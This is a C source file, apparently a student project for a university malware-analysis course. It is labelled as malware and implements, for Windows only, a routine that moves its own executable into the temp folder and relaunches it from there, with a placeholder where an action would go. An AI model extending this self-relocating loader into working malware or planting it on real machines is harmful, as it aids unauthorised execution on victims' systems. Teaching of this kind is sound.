/* -------------------------------------------------------------------
 * malwareEjemplo.c
 * version 1.0
 * Copyright (C) 2016  Jose Ricardo Rodriguez Abreu.
 * Facultad de Ciencias,
 * Universidad Nacional Autonoma de Mexico, Mexico.
 *
 * Este programa es software libre; se puede redistribuir
 * y/o modificar en los terminos establecidos por la
 * Licencia Publica General de GNU tal como fue publicada
 * por la Free Software Foundation en la version 2 o
 * superior.
 *
 * Este programa es distribuido con la esperanza de que
 * resulte de utilidad, pero SIN GARANTIA ALGUNA; de hecho
 * sin la garantia implicita de COMERCIALIZACION o
 * ADECUACION PARA PROPOSITOS PARTICULARES. Vease la
 * Licencia Publica General de GNU para mayores detalles.
 *
 * Con este programa se debe haber recibido una copia de la
 * Licencia Publica General de GNU, de no ser asi, visite el
 * siguiente URL:
 * http://www.gnu.org/licenses/gpl.html
 * o escriba a la Free Software Foundation Inc.,
 * 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 * -------------------------------------------------------------------
 */

/**
 * @file malwareEjemplo.c
 * @author Jose Ricardo Rodriguez Abreu
 * @date 18 Sep 2016
 * @brief File containing the first project for the "Malware Analysis"
 * class.
 *
 * Este programa es un malware que intenta duplicarse y generar
 * llamadas al sistema en Windows.
 *
 * @see https://github.com/ricardorodab/malwareEjemplo
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 *
 * Revisamos en que sistema operativo nos encontramos solo
 * si es windows continuamos la ejecucion del programa:
 *
 */

// Windows (32-bit y 64-bit)
#ifdef _WIN32
//#ifdef _WIN64
#define _UNICODE

#include <tchar.h>
#include <wchar.h>
#include <windows.h>

#define BUFSIZE 1024

/**
 * Funcion que revisa que estemos en el directorio tmp
 * nos regresa el valor de 1 o 0 como booleano.
 *
 * @return 1 si estamos en tmp y 0 caso contrario.
 */
int cmplocation(char* nombre)
{
  char tmp[MAX_PATH];
  char loc[MAX_PATH];
  GetCurrentDirectory(sizeof(loc)-1,loc);
  GetTempPath(sizeof(tmp)-1,tmp);
  // Hacemos esto porque la cadena que nos regresa
  // GetCurrent y GetTemp difieren siempre en que uno
  // termina con "\" y el otro no.
  strcat(loc,"\\");
  int bool = strcmp(tmp,loc);
  
  if(bool == 0)
    {
      // Solo pasa esto si esta en tmp asi que
      // desde aqui invocamos las funciones que queremos
      // que el malware ejecute.
      printf("Desde aqui actua\n");
      return -1;      
    }
  return mueveArchivo(loc,tmp,nombre);
}

/**
 * Esta funcion mueve el archivo desde cualquier lugar
 * hasta la localidad de tmp de Windows.
 * @param origen - Es donde se encuentra actualmente el archivo.
 * @param destino - Es a donde queremos mover (tmp);
 * @return Un 0 si hubo error, 1 en otro caso.
 */
int mueveArchivo(char* origen, char* destino, char* nombre)
{
  strcat(origen,nombre);
  strcat(destino,nombre);
  printf("Se mueve de %s ---> %s\n",origen,destino);
  int result = MoveFile(origen,destino);
  return result;
}

/**
 * Funcion que ejecuta un programa exe o un comando.
 * @param nombre - Es el nombre del archivo o el comando.
 */
void ejecutarDeNuevo(char* nombre)
{
  char tmp[MAX_PATH];
  // El directorio padre del nuevo proceso:
  char tmpPure[MAX_PATH];
  // Volvemos a localizar a %tmp%.
  GetTempPath(sizeof(tmp)-1,tmp);
  strcpy(tmpPure,tmp);
  strcat(tmp,nombre);
  // Magia negra para ejecutar mas cosas:
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  
  ZeroMemory( &si, sizeof(si) );
  si.cb = sizeof(si);
  ZeroMemory( &pi, sizeof(pi) );
  // Funcion que tome de ejemplo. Original en:
  //  https://goo.gl/8YYFym
  CreateProcess(NULL,   // No module name (use command line)
		tmp,    // Command line
		NULL,   // Process handle not inheritable
		NULL,   // Thread handle not inheritable
		FALSE,  // Set handle inheritance to FALSE
		0,      // No creation flags
		NULL,   // Use parent's environment block
		tmpPure,// Use parent's starting directory
		&si,    // Pointer to STARTUPINFO structure
		&pi );  // Pointer to PROCESS_INFORMATION structure
}

/**
 * Es la unica función que llama
 * el main de nuestro malware en Window.
 * @param argc - Es el número de argumentos.
 * @param argv - Nos importa porque contiene el nombre.
 */
void so(int argc, char** argv)
{
  printf("Hola Windows!\n");

  int continuar = cmplocation(argv[0]);
  if(continuar == 0)
    {
      printf("Algo fallo\n");
    }
  else if(continuar == -1)
    {
      printf("Success!!!\n");
      exit(0);
    }else{
    ejecutarDeNuevo(argv[0]);
  }
  exit(0);
} //Fin de la funcion so de Windows.



// Apple:
#elif __APPLE__
void so(int argc, char** argv)
{
  printf("Hola Apple!\n");
  exit(0);
}

// Linux:
#elif __linux__
void so(int argc, char** argv)
{
  printf("Hola Linux!\n");
  exit(0);
}

// Unix:
#elif __unix__
void so(int argc, char** argv)
{
  printf("Hola Unix!\n");
  exit(0);
}

// Caso ajeno:
#else
#   error "Unknown compiler"
#endif


int main(int argc, char** argv)
{
  so(argc, argv);
  return 0;
}
